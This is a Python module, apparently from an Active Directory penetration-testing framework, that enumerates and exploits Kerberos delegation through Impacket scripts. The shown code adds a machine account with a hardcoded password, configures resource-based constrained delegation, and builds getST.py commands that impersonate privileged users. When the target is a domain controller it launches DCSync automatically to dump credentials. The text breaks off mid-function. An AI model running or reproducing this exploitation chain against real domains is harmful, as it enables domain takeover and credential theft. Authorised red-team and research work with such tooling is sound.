"""CLI orchestration for Kerberos delegation enumeration and exploitation.

This module keeps delegation *UI + reporting* logic out of the monolith.
The service layer performs the tool execution and basic parsing; this module:
- resolves workspace paths
- prints operation headers
- updates reports + telemetry
- renders Rich tables
- handles user prompts for enumeration and exploitation
"""

from __future__ import annotations

import os
import re
import subprocess
from typing import Protocol

from adscan_internal.principal_utils import normalize_machine_account
from adscan_internal import (
    print_error,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_success,
    print_warning,
    telemetry,
)
from adscan_internal.cli.common import build_lab_event_fields
from adscan_internal.command_runner import default_runner
from adscan_internal.rich_output import (
    mark_sensitive,
    print_exception,
)
from rich.prompt import Confirm

from adscan_internal.integrations.impacket.runner import (
    ImpacketContext,
    ImpacketKerberosRetryContext,
    ImpacketRunner,
)
from adscan_internal.services.machine_account_quota_state_service import (
    clear_machine_account_quota_exhausted,
    mark_machine_account_quota_exhausted,
)


class DelegationShell(Protocol):
    """Minimal shell surface used by the delegation controller."""

    console: object
    domains: list[str]
    domains_dir: str
    domain: str | None
    type: str | None
    auto: bool
    scan_mode: str | None
    current_workspace_dir: str | None
    domains_data: dict
    impacket_scripts_dir: str | None
    command_runner: object
    license_mode: object

    def _get_workspace_cwd(self) -> str: ...

    def _get_lab_slug(self) -> str | None: ...

    def build_auth_impacket_no_host(
        self, username: str, password: str, domain: str, kerberos: bool = True
    ) -> str: ...

    def check_maq(self, domain: str, username: str, password: str) -> int: ...

    def get_delegatable_privileged_user(self, domain: str) -> str | None: ...

    def is_computer_dc(self, domain: str, hostname: str) -> bool: ...

    def return_credentials(self, domain: str) -> tuple[str | None, str | None]: ...

    def update_report_field(self, domain: str, field: str, value: object) -> None: ...

    def run_command(
        self, command: str, *, timeout: int | None = None, **kwargs
    ) -> subprocess.CompletedProcess[str] | None: ...

    def ask_for_dcsync(self, domain: str, username: str, ticket: str) -> None: ...

    def dcsync(self, domain: str, username: str, ticket: str) -> None: ...

    def add_credential(
        self,
        domain: str,
        user: str,
        cred: str,
        host: str | None = None,
        service: str | None = None,
        skip_hash_cracking: bool = False,
        pdc_ip: str | None = None,
        source_steps: list[object] | None = None,
        prompt_for_user_privs_after: bool = True,
        skip_user_privs_enumeration: bool = False,
        verify_credential: bool = True,
        verify_local_credential: bool = True,
        prompt_local_reuse_after: bool = True,
        ui_silent: bool = False,
        ensure_fresh_kerberos_ticket: bool = True,
        force_authenticated_enumeration: bool = False,
        prompt_when_already_authenticated: bool = False,
        allow_empty_credential: bool = False,
        trusted_manual_validation: bool = False,
    ) -> None: ...


def _build_impacket_context(shell: DelegationShell) -> ImpacketContext:
    """Build central Impacket runner context from the interactive shell."""
    return ImpacketContext(
        impacket_scripts_dir=str(shell.impacket_scripts_dir or ""),
        validate_script_exists=lambda path: os.path.isfile(path)
        and os.access(path, os.X_OK),
        get_domain_pdc=lambda domain: str(
            (shell.domains_data.get(domain) or {}).get("pdc") or ""
        )
        or None,
        sync_clock_with_pdc=lambda domain: bool(
            shell.do_sync_clock_with_pdc(domain, verbose=True)
        ),
        workspace_dir=shell.current_workspace_dir,
        domains_data=shell.domains_data,
    )


def _build_impacket_kerberos_retry_context(
    shell: DelegationShell,
    *,
    domain: str,
    username: str,
    credential: str,
) -> ImpacketKerberosRetryContext:
    """Build deterministic Kerberos context for an Impacket auth principal."""
    domain_info = shell.domains_data.get(domain) or {}
    dc_ip = str(domain_info.get("pdc") or "").strip() or None
    return ImpacketKerberosRetryContext(
        domain=domain,
        username=username,
        credential=credential,
        dc_ip=dc_ip,
    )


def _run_find_delegation_command(
    shell: DelegationShell,
    *,
    command: str,
    domain: str,
    username: str,
    password: str,
    kerberos: bool = False,
) -> subprocess.CompletedProcess[str] | None:
    """Run ``findDelegation.py`` through the central Impacket runner."""
    runner = ImpacketRunner(command_runner=default_runner)
    kerberos_command = command if " -k" in f" {command}" else f"{command} -k"
    selected_command = kerberos_command if kerberos else command
    return runner.run_raw_command(
        script_name="findDelegation.py",
        command=selected_command,
        ctx=_build_impacket_context(shell),
        kerberos_retry_context=_build_impacket_kerberos_retry_context(
            shell,
            domain=domain,
            username=username,
            credential=password,
        ),
        auth_policy_protocol="ldap",
        kerberos_command=kerberos_command,
        timeout=300,
        capture_output=True,
    )


def do_enum_delegations(shell: DelegationShell, domain: str) -> None:
    """
    Enumerates Kerberos delegations in the specified domain.

    Usage: enum_delegations <domain>

    Performs the enumeration of Kerberos delegations in the domain

    """
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Build the base command
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        find_delegation_path = os.path.join(
            shell.impacket_scripts_dir, "findDelegation.py"
        )
        if not os.path.isfile(find_delegation_path) or not os.access(
            find_delegation_path, os.X_OK
        ):
            print_error(
                f"findDelegation.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        auth_username = shell.domains_data[shell.domain]["username"]
        auth_password = shell.domains_data[shell.domain]["password"]
        auth = shell.build_auth_impacket_no_host(
            auth_username,
            auth_password,
            shell.domain,
        )
        marked_domain = mark_sensitive(domain, "domain")
        command = f"{find_delegation_path} {auth} -target-domain {marked_domain}"
        marked_domain = mark_sensitive(domain, "domain")
        print_info(f"Enumerating Kerberos delegations in domain {marked_domain}")
        print_info_debug(f"Command: {command}")

        # First execution without -k
        completed_process = _run_find_delegation_command(
            shell,
            command=command,
            domain=domain,
            username=auth_username,
            password=auth_password,
        )
        if completed_process is None:
            print_error("Error enumerating delegations.")
            return

        output = completed_process.stdout
        # stderr is available in completed_process.stderr if needed

        # If there is a credential error, try with -k
        if (
            "invalidCredentials" in output or "AcceptSecurityContext error" in output
        ):  # Check against 'output' from the first run
            command += " -k"
            print_info("Retrying with -k")
            # Overwrite completed_process with the result of the retry
            completed_process = _run_find_delegation_command(
                shell,
                command=command,
                domain=domain,
                username=auth_username,
                password=auth_password,
                kerberos=True,
            )
            if completed_process is None:
                print_error("Error enumerating delegations.")
                return
            output = completed_process.stdout
        if completed_process.returncode == 0:
            # Initialize the domain dictionary if it does not exist
            if domain not in shell.domains_data:
                shell.domains_data[domain] = {}

            # Initialize delegations as an empty list
            shell.domains_data[domain]["delegations"] = []

            # Check if there are no entries
            if "No entries found!" in output:
                print_error("No delegations found in domain.")
                shell.update_report_field(domain, "unconstrained_delegation", None)
                shell.update_report_field(domain, "constrained_delegation", None)

                # Telemetry: track when no delegations found
                try:
                    properties = {
                        "total_delegations": 0,
                        "unconstrained_count": 0,
                        "constrained_count": 0,
                        "constrained_protocol_transition_count": 0,
                        "resource_based_constrained_count": 0,
                        "unknown_count": 0,
                        "scan_mode": getattr(shell, "scan_mode", None),
                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                        "workspace_type": shell.type,
                        "auto_mode": shell.auto,
                    }
                    properties.update(
                        build_lab_event_fields(shell=shell, include_slug=True)
                    )
                    telemetry.capture("delegations_enumerated", properties)
                except Exception as e:
                    telemetry.capture_exception(e)
                return

            # Split the output into lines and process
            lines = output.strip().split("\n")
            # Find the index of the line containing "AccountName"
            try:
                account_name_index = next(
                    i for i, line in enumerate(lines) if "AccountName" in line
                )
                # Delegations begin two lines after "AccountName"
                delegations_start = account_name_index + 2

                # Track delegation types for telemetry (without exfiltrating user info)
                delegation_type_counts = {
                    "unconstrained": 0,
                    "constrained": 0,
                    "constrained_protocol_transition": 0,
                    "resource_based_constrained": 0,
                    "unknown": 0,
                }

                # Store full delegation data for rich display
                delegations_full_data = []

                # Process only the lines after the headers
                for line in lines[delegations_start:]:
                    if not line.strip():
                        continue

                    # Try to parse delegation type using regex (similar to enum_delegations_user)
                    # Pattern matches: AccountName AccountType DelegationType DelegationTo
                    matches = re.findall(
                        r"(\S+)\s+(\S+)\s+((?:Resource-Based\s+)?(?:Unconstrained|Constrained)(?:\s+w/(?:o)?\s+Protocol\s+Transition)?)\s+(\S+)",
                        line,
                        re.IGNORECASE,
                    )

                    if matches:
                        account, account_type, delegation_type, delegation_to = matches[
                            0
                        ]
                        if account:  # If the account is not empty
                            delegation_type_lower = delegation_type.lower()

                            # Skip unconstrained delegations on Domain Controllers (false positives)
                            try:
                                is_unconstrained = (
                                    "unconstrained" in delegation_type_lower
                                    and "resource-based" not in delegation_type_lower
                                )
                                if (
                                    is_unconstrained
                                    and account_type.lower() == "computer"
                                ):
                                    # Convert machine account (e.g., DC$) to hostname for DC detection
                                    host_candidate = account.rstrip("$")
                                    if host_candidate and shell.is_computer_dc(
                                        domain, host_candidate
                                    ):
                                        marked_domain = mark_sensitive(domain, "domain")
                                        marked_account = mark_sensitive(account, "user")
                                        print_info_debug(
                                            "[delegation] Skipping unconstrained "
                                            "delegation for Domain Controller "
                                            f"account {marked_account} in domain "
                                            f"{marked_domain} (considered expected "
                                            "behaviour)."
                                        )
                                        # Do not store or count this delegation
                                        continue
                            except Exception as exc:
                                telemetry.capture_exception(exc)

                            shell.domains_data[domain]["delegations"].append(account)

                            # Store full delegation data
                            delegations_full_data.append(
                                {
                                    "account": account,
                                    "account_type": account_type,
                                    "delegation_type": delegation_type,
                                    "delegation_to": delegation_to,
                                }
                            )

                            # Classify delegation type for telemetry
                            if "unconstrained" in delegation_type_lower:
                                delegation_type_counts["unconstrained"] += 1
                            elif "resource-based" in delegation_type_lower:
                                delegation_type_counts[
                                    "resource_based_constrained"
                                ] += 1
                            elif (
                                "protocol transition" in delegation_type_lower
                                and "w/o" not in delegation_type_lower
                            ):
                                delegation_type_counts[
                                    "constrained_protocol_transition"
                                ] += 1
                            elif "constrained" in delegation_type_lower:
                                delegation_type_counts["constrained"] += 1
                            else:
                                delegation_type_counts["unknown"] += 1
                    else:
                        # Fallback: simple parsing for lines that don't match regex
                        parts = line.split()
                        if parts and len(parts) > 0:
                            account = parts[0].strip()
                            if account:  # If the account is not empty
                                shell.domains_data[domain]["delegations"].append(
                                    account
                                )
                                # Store with unknown type
                                delegations_full_data.append(
                                    {
                                        "account": account,
                                        "account_type": "Unknown",
                                        "delegation_type": "Unknown",
                                        "delegation_to": "N/A",
                                    }
                                )
                                delegation_type_counts["unknown"] += 1

                # Remove duplicates while preserving order
                shell.domains_data[domain]["delegations"] = list(
                    dict.fromkeys(shell.domains_data[domain]["delegations"])
                )

                total_delegations = len(shell.domains_data[domain]["delegations"])

                # Update the technical report cache for delegation-related findings
                if total_delegations == 0:
                    # Explicitly record that no delegations were found
                    shell.update_report_field(domain, "unconstrained_delegation", None)
                    shell.update_report_field(domain, "constrained_delegation", None)
                else:
                    has_unconstrained = delegation_type_counts["unconstrained"] > 0
                    has_constrained = any(
                        delegation_type_counts[key] > 0
                        for key in (
                            "constrained",
                            "constrained_protocol_transition",
                            "resource_based_constrained",
                        )
                    )
                    shell.update_report_field(
                        domain, "unconstrained_delegation", has_unconstrained
                    )
                    shell.update_report_field(
                        domain, "constrained_delegation", has_constrained
                    )

                # Telemetry: track delegation enumeration results
                try:
                    properties = {
                        "total_delegations": total_delegations,
                        "unconstrained_count": delegation_type_counts["unconstrained"],
                        "constrained_count": delegation_type_counts["constrained"],
                        "constrained_protocol_transition_count": delegation_type_counts[
                            "constrained_protocol_transition"
                        ],
                        "resource_based_constrained_count": delegation_type_counts[
                            "resource_based_constrained"
                        ],
                        "unknown_count": delegation_type_counts["unknown"],
                        "scan_mode": getattr(shell, "scan_mode", None),
                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                        "workspace_type": shell.type,
                        "auto_mode": shell.auto,
                    }
                    properties.update(
                        build_lab_event_fields(shell=shell, include_slug=True)
                    )
                    telemetry.capture("delegations_enumerated", properties)
                except Exception as e:
                    telemetry.capture_exception(e)

                # Display delegations with professional formatting
                from adscan_internal.rich_output import print_delegations_summary

                print_delegations_summary(domain, delegations_full_data)
            except StopIteration as e:
                telemetry.capture_exception(e)
                print_error("Expected structure not found in output")

                # If the expected structure is missing, mark delegations as not found
                shell.update_report_field(domain, "unconstrained_delegation", None)
                shell.update_report_field(domain, "constrained_delegation", None)

                # Telemetry: track when no delegations structure found
                try:
                    properties = {
                        "total_delegations": 0,
                        "unconstrained_count": 0,
                        "constrained_count": 0,
                        "constrained_protocol_transition_count": 0,
                        "resource_based_constrained_count": 0,
                        "unknown_count": 0,
                        "error": "structure_not_found",
                        "scan_mode": getattr(shell, "scan_mode", None),
                        "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                        "workspace_type": shell.type,
                        "auto_mode": shell.auto,
                    }
                    properties.update(
                        build_lab_event_fields(shell=shell, include_slug=True)
                    )
                    telemetry.capture("delegations_enumerated", properties)
                except Exception as exc:
                    telemetry.capture_exception(exc)
        else:
            print_error(
                f"Error enumerating delegations: {completed_process.stderr.strip() if completed_process.stderr else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error enumerating delegations.")
        print_exception(show_locals=False, exception=e)


def enum_delegations_user(
    shell: DelegationShell, domain: str, username: str, password: str
) -> None:
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Build the base command
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        find_delegation_path = os.path.join(
            shell.impacket_scripts_dir, "findDelegation.py"
        )
        if not os.path.isfile(find_delegation_path) or not os.access(
            find_delegation_path, os.X_OK
        ):
            print_error(
                f"findDelegation.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        marked_domain = mark_sensitive(domain, "domain")
        command = f"{find_delegation_path} {auth} -target-domain {marked_domain}"
        marked_username = mark_sensitive(username, "user")
        print_info_verbose(f"Enumerating delegation details for user {marked_username}")

        # First execution without -k
        completed_process = _run_find_delegation_command(
            shell,
            command=command,
            domain=domain,
            username=username,
            password=password,
        )
        if completed_process is None:
            print_error("Error enumerating user delegations.")
            return
        output = completed_process.stdout
        error = completed_process.stderr
        # If there is a credentials error, try with -k
        if "invalidCredentials" in output or "AcceptSecurityContext error" in output:
            command += " -k"
            print_success("Retrying with -k")
            completed_process = _run_find_delegation_command(
                shell,
                command=command,
                domain=domain,
                username=username,
                password=password,
                kerberos=True,
            )
            if completed_process is None:
                print_error("Error enumerating user delegations.")
                return
            output = completed_process.stdout
            error = completed_process.stderr
        if completed_process.returncode == 0:
            # Process the output line by line
            lines = output.strip().split("\n")
            for line in lines:
                if line.startswith("AccountName") or line.startswith("-"):
                    continue

                # Use regular expression to split the line while preserving spaces in delegation types
                matches = re.findall(
                    r"(\S+)\s+(\S+)\s+((?:Resource-Based\s+)?Constrained(?:\s+w/(?:o)?\s+Protocol\s+Transition)?)\s+(\S+)",
                    line,
                )

                if matches:
                    account_name, account_type, delegation_type, delegation_to = (
                        matches[0]
                    )
                    if account_name == username:  # Only process the specific user
                        # Directly proceed to ask for exploitation with the full delegation type
                        shell.ask_for_exploit_delegation(
                            domain,
                            username,
                            password,
                            delegation_type,
                            delegation_to,
                        )
                        break  # Exit after finding the user
        else:
            print_error(f"Error enumerating delegations: {error}")
    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error enumerating user delegations.")
        print_exception(show_locals=False, exception=e)


def ask_for_exploit_delegation(
    shell: DelegationShell,
    domain: str,
    username: str,
    password: str,
    delegation_type: str,
    delegation_to: str,
) -> None:
    """Prompt user to exploit a delegation."""
    from adscan_internal.rich_output import mark_sensitive

    marked_delegation_to = mark_sensitive(delegation_to, "service")
    marked_username = mark_sensitive(username, "user")
    respuesta = Confirm.ask(
        f"Do you want to exploit the delegation {delegation_type} on {marked_delegation_to} for user {marked_username}?",
        default=True,
    )
    if respuesta:
        if delegation_type.lower() == "constrained":
            exploit_delegation_rbcd(shell, domain, username, password, delegation_to)
        elif delegation_type == "Constrained w/ Protocol Transition":
            exploit_delegation_constrained(
                shell, domain, username, password, delegation_to
            )


def exploit_delegation_constrained(
    shell: DelegationShell,
    domain: str,
    username: str,
    password: str,
    delegation_to: str,
) -> None:
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Extract the hostname from the SPN (after the forward slash)
        target_host = (
            delegation_to.split("/")[1] if "/" in delegation_to else delegation_to
        )
        target_user = shell.get_delegatable_privileged_user(domain)

        # Build the netexec command
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return
        get_st_path = os.path.join(shell.impacket_scripts_dir, "getST.py")
        if not os.path.isfile(get_st_path) or not os.access(get_st_path, os.X_OK):
            print_error(
                f"getST.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return
        marked_delegation_to = mark_sensitive(delegation_to, "service")
        command = f"{get_st_path} -spn '{marked_delegation_to}' -impersonate '{target_user}' {auth}"

        marked_target_host = mark_sensitive(target_host, "hostname")
        print_info(f"Exploiting constrained delegation against {marked_target_host}")

        # Telemetry: track delegation exploitation attempt
        try:
            properties = {
                "delegation_type": "constrained_protocol_transition",
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_started", properties)
        except Exception as e:
            telemetry.capture_exception(e)

        # Execute the command using the existing execute_dump_lsa function
        execute_constrained(
            shell,
            command,
            domain,
            target_host,
            target_user,
            username=username,
            password=password,
        )

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error exploiting constrained delegation.")
        print_exception(show_locals=False, exception=e)


def execute_constrained(
    shell: DelegationShell,
    command: str,
    domain: str,
    target_host: str,
    target_user: str,
    *,
    username: str = "",
    password: str = "",
) -> None:
    from adscan_internal.rich_output import mark_sensitive
    from adscan_internal.services.exploitation import ExploitationService

    try:
        service = ExploitationService()
        impacket_context = (
            _build_impacket_context(shell) if username and password else None
        )
        kerberos_retry_context = (
            _build_impacket_kerberos_retry_context(
                shell,
                domain=domain,
                username=username,
                credential=password,
            )
            if username and password
            else None
        )
        runner_kwargs = {}
        if impacket_context is not None and kerberos_retry_context is not None:
            runner_kwargs = {
                "impacket_context": impacket_context,
                "kerberos_retry_context": kerberos_retry_context,
            }
        result = service.delegation.run_s4proxy_command(
            command=command,
            timeout=300,
            **runner_kwargs,
        )
        output_str = (result.stdout or "") + (result.stderr or "")

        if result.returncode == 0:
            marked_target_host = mark_sensitive(target_host, "hostname")
            print_success(f"Command executed successfully on {marked_target_host}.")

            # Update active attack-graph edge (if this exploitation was launched from an attack path).
            if hasattr(shell, "_update_active_attack_graph_step_status"):
                try:
                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                        domain=domain,
                        status="success",
                        notes={
                            "target_host": target_host,
                            "impersonated": target_user,
                        },
                    )
                except Exception as exc:
                    telemetry.capture_exception(exc)

            # Extract the .ccache file path from the output
            match = re.search(r"Saving ticket in ([^\s]+)", output_str)
            if match:
                ccache_file = match.group(1)
                print_warning(f".ccache file found: {ccache_file}")
            else:
                print_error("Could not extract the .ccache file from the output.")
                ccache_file = None

            # Telemetry: track successful delegation exploitation
            try:
                properties = {
                    "delegation_type": "constrained_protocol_transition",
                    "ticket_obtained": ccache_file is not None,
                    "target_is_dc": shell.is_computer_dc(domain, target_host),
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_success", properties)
            except Exception as e:
                telemetry.capture_exception(e)

            # Check if the host is a Domain Controller.
            # Returns True if identified as DC.
            if shell.is_computer_dc(domain, target_host):
                marked_target_host = mark_sensitive(target_host, "hostname")
                print_warning(
                    f"{marked_target_host} identified as Domain Controller. Proceeding with DCSync."
                )
                if ccache_file:
                    # Call dcsync passing the .ccache file path instead of the password
                    shell.dcsync(domain, target_user, ccache_file)
            else:
                marked_target_host = mark_sensitive(target_host, "hostname")
                print_warning(
                    f"{marked_target_host} is not identified as a Domain Controller. DCSync will not be invoked."
                )
        else:
            if hasattr(shell, "_update_active_attack_graph_step_status"):
                try:
                    shell._update_active_attack_graph_step_status(  # type: ignore[attr-defined]
                        domain=domain,
                        status="failed",
                        notes={
                            "target_host": target_host,
                            "impersonated": target_user,
                        },
                    )
                except Exception as exc:
                    telemetry.capture_exception(exc)

            # Telemetry: track failed delegation exploitation
            try:
                properties = {
                    "delegation_type": "constrained_protocol_transition",
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_failed", properties)
            except Exception as e:
                telemetry.capture_exception(e)

            error_msg = (
                (result.stderr or "").strip()
                if result.stderr
                else (result.stdout or "").strip()
            )
            marked_target_host = mark_sensitive(target_host, "hostname")
            print_error(
                f"Error executing command on {marked_target_host}: {error_msg if error_msg else 'Details not available'}"
            )
    except Exception as e:
        telemetry.capture_exception(e)
        marked_target_host = mark_sensitive(target_host, "hostname")
        print_error(f"Exception in execute_constrained for {marked_target_host}.")
        print_exception(show_locals=False, exception=e)


def exploit_delegation_rbcd(
    shell: DelegationShell, domain: str, username: str, password: str, target: str
) -> None:
    """Coordinates the exploitation of constrained delegation."""
    from adscan_internal.rich_output import mark_sensitive

    try:
        # Telemetry: track delegation exploitation attempt
        try:
            properties = {
                "delegation_type": "resource_based_constrained",
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_started", properties)
        except Exception as e:
            telemetry.capture_exception(e)

        # First, check MAQ
        maq = shell.check_maq(domain, username, password)
        success = False

        if maq > 0:
            # If MAQ allows creating computers, continue with the original flow
            computer_name = "rbcd_computer$"
            computer_pass = "Password12321"

            marked_username = mark_sensitive(username, "user")
            print_success(
                f"Starting constrained delegation exploitation for {marked_username}"
            )

            # Step 1: Create new computer
            if shell.add_computer_to_domain(
                domain, computer_name, computer_pass, username, password
            ):
                # Step 2: Configure RBCD
                if shell.set_rbcd_delegation(
                    domain, computer_name, target, computer_pass, username, password
                ):
                    # Step 3: Create forwardable ticket
                    if shell.create_forwardable_ticket(
                        domain, computer_name, username, computer_pass
                    ):
                        # Step 4: Launch S4Proxy
                        if shell.launch_s4proxy(domain, target, username, password):
                            success = True

        else:
            # If MAQ does not allow creating computers, use an existing one
            print_warning("MachineAccountQuota is 0, new computers cannot be created")
            print_info("Select an existing user to configure RBCD")

            selected_user, selected_cred = shell.return_credentials(domain)
            if selected_user and selected_cred:
                # Configure RBCD with the selected user
                if shell.set_rbcd_delegation(
                    domain, selected_user, target, selected_cred, username, password
                ):
                    # Create forwardable ticket
                    if shell.create_forwardable_ticket(
                        domain, selected_user, username, selected_cred
                    ):
                        # Launch S4Proxy
                        if shell.launch_s4proxy(domain, target, username, password):
                            success = True

        # Telemetry: track exploitation result
        try:
            if success:
                properties = {
                    "delegation_type": "resource_based_constrained",
                    "used_new_computer": maq > 0,
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_success", properties)
            else:
                properties = {
                    "delegation_type": "resource_based_constrained",
                    "maq_available": maq > 0,
                    "scan_mode": getattr(shell, "scan_mode", None),
                    "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                    "workspace_type": shell.type,
                    "auto_mode": shell.auto,
                }
                properties.update(
                    build_lab_event_fields(shell=shell, include_slug=True)
                )
                telemetry.capture("delegation_exploitation_failed", properties)
        except Exception as e:
            telemetry.capture_exception(e)

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error during constrained delegation exploitation.")
        print_exception(show_locals=False, exception=e)

        # Telemetry: track exception during exploitation
        try:
            properties = {
                "delegation_type": "resource_based_constrained",
                "error": True,
                "scan_mode": getattr(shell, "scan_mode", None),
                "auth_type": shell.domains_data[domain].get("auth", "unknown"),
                "workspace_type": shell.type,
                "auto_mode": shell.auto,
            }
            properties.update(build_lab_event_fields(shell=shell, include_slug=True))
            telemetry.capture("delegation_exploitation_failed", properties)
        except Exception as e2:
            telemetry.capture_exception(e2)


def add_computer_to_domain(
    shell: DelegationShell,
    domain: str,
    computer_name: str,
    computer_pass: str,
    username: str,
    password: str,
) -> bool:
    """Adds a new computer to the domain."""
    from adscan_internal.services.exploitation import ExploitationService

    try:
        if domain not in shell.domains:
            marked_target_domain = mark_sensitive(domain, "domain")
            print_error(
                f"Domain '{marked_target_domain}' is not configured. Please add or select a valid domain."
            )
            return None

        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return None

        getaddcomputer_py_path = os.path.join(
            shell.impacket_scripts_dir, "addcomputer.py"
        )
        if not os.path.isfile(getaddcomputer_py_path) or not os.access(
            getaddcomputer_py_path, os.X_OK
        ):
            print_error(
                f"addcomputer.py not found or not executable in {shell.impacket_scripts_dir}. Please check Impacket installation."
            )
            return None
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        command = f"{getaddcomputer_py_path} -computer-name '{computer_name}$' -computer-pass '{computer_pass}' "
        command += f"-dc-host {shell.domains_data[domain]['pdc']} "
        command += f"{auth}"

        print_success("Adding computer to the domain")
        service = ExploitationService()
        outcome = service.delegation.run_addcomputer_command(
            command=command,
            timeout=300,
            impacket_context=_build_impacket_context(shell),
            kerberos_retry_context=_build_impacket_kerberos_retry_context(
                shell,
                domain=domain,
                username=username,
                credential=password,
            ),
        )

        if outcome.success:
            clear_machine_account_quota_exhausted(
                shell,
                domain=domain,
                username=username,
            )
            print_success(f"Computer {computer_name}$ added successfully")
            machine_account = normalize_machine_account(computer_name)
            try:
                shell.add_credential(
                    domain,
                    machine_account,
                    computer_pass,
                    prompt_for_user_privs_after=False,
                    skip_user_privs_enumeration=True,
                    ui_silent=True,
                    ensure_fresh_kerberos_ticket=True,
                    force_authenticated_enumeration=False,
                    prompt_when_already_authenticated=False,
                )
            except Exception as exc:
                telemetry.capture_exception(exc)
                marked_machine = mark_sensitive(machine_account, "user")
                print_warning(
                    "The computer was created successfully, but ADscan could not "
                    f"persist the machine credential bootstrap for {marked_machine}."
                )
            return True
        if outcome.quota_exceeded:
            mark_machine_account_quota_exhausted(
                shell,
                domain=domain,
                username=username,
                reason=outcome.output or "MachineAccountQuota exceeded for actor.",
            )
            marked_user = mark_sensitive(username, "user")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                "MachineAccountQuota exhausted for the current actor: "
                f"{marked_user} can no longer create additional machine accounts in {marked_domain}."
            )
        print_error(f"Error adding computer: {outcome.output or 'unknown error'}")
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error adding computer.")
        print_exception(show_locals=False, exception=e)
        return False


def set_rbcd_delegation(
    shell: DelegationShell,
    domain: str,
    computer_name: str,
    target: str,
    computer_pass: str,
    username: str,
    password: str,
) -> bool:
    """Configures RBCD for the created computer."""
    from adscan_internal.services.exploitation import ExploitationService

    try:
        _ = computer_pass  # reserved for future reuse/cleanup flows
        auth = shell.build_auth_impacket_no_host(username, password, domain)
        service = ExploitationService()
        build_result = service.delegation.build_rbcd_write_command(
            impacket_scripts_dir=shell.impacket_scripts_dir,
            delegate_from=computer_name,
            delegate_to=target,
            dc_ip=shell.domains_data[domain]["pdc"],
            auth=auth,
        )
        if not build_result.success or not build_result.command:
            print_error(str(build_result.error_message or "Error configuring RBCD."))
            return False

        print_success("Configuring RBCD")
        outcome = service.delegation.run_rbcd_command(
            command=build_result.command,
            timeout=300,
            impacket_context=_build_impacket_context(shell),
            kerberos_retry_context=_build_impacket_kerberos_retry_context(
                shell,
                domain=domain,
                username=username,
                credential=password,
            ),
        )

        if outcome.success:
            if outcome.already_had_delegation:
                print_success(
                    "RBCD was already configured: this machine account already had "
                    "the delegation privileges needed for this target (no changes were required)."
                )
            else:
                print_success("RBCD configured successfully")
            return True

        print_error("Error configuring RBCD. Check logs for details.")
        return False

    except Exception as e:
        telemetry.capture_exception(e)
        print_error("Error configuring RBCD.")
        print_exception(show_locals=False, exception=e)
        return False


def create_forwardable_ticket(
    shell: DelegationShell,
    domain: str,
    s4u_account: str,
    username: str,
    s4u_password: str,
) -> bool:
    """Create a forwardable ticket using S4U via KerberosTicketService."""
    from adscan_internal.rich_output import mark_sensitive
    from adscan_internal.services.kerberos_ticket_service import (
        KerberosTicketService,
    )

    try:
        # Get a privileged user that can be delegated
        target_user = shell.get_delegatable_privileged_user(domain)
        if not target_user:
            print_error("No privileged user found that can be delegated")
            return False

        # Normalize S4U account (drop trailing $ for computer accounts)
        if isinstance(s4u_account, str) and s4u_account.endswith("$"):
            s4u_account = s4u_account.rstrip("$")

        if not shell.impacket_scripts_dir:
            print_error(
                "Impacket scripts directory not configured. Please ensure Impacket is installed via 'adscan install'."
            )
            return False

        service = KerberosTicketService()
        result = service.create_forwardable_ticket(
            impacket_scripts_dir=shell.impacket_scripts_dir,
            domain=domain,
            pdc_hostname=shell.domains_data[domain]["pdc_hostname"],
            pdc_ip=shell.domains_data[domain]["pdc"],
            target_user=target_user,
            s4u_account=s4u_account,
